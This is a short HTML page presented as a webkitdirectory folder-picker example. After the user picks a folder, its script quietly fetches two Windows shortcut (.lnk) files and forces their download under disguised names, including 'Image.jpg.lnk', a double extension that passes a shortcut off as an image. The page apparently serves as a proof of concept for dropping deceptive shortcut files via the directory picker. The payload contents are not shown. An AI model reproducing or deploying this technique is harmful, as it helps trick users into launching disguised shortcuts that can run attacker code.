<!doctype html>
<html lang="en">

<head>
<meta charset="utf-8">
<title>WebKit Directory Example</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

<h3>Directory selection using webkitdirectory</h3>

<input type="file" id="dirInput" webkitdirectory multiple>

<script>

const input = document.getElementById("dirInput");

input.addEventListener("change", async (event) => {

    const files = event.target.files;

    console.log("Selected files:");

    for (const file of files) {
        console.log(file.webkitRelativePath);
    }

    // Example: trigger downloads instead of writing directly
    const lnk1 = await fetch("folder.lnk").then(r => r.blob());
    const lnk2 = await fetch("lnkextra.lnk").then(r => r.blob());

    downloadFile(lnk1, "New folder.lnk");
    downloadFile(lnk2, "Image.jpg.lnk");

});

function downloadFile(blob, name) {
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = name;
    a.click();
}

</script>

</body>
</html>
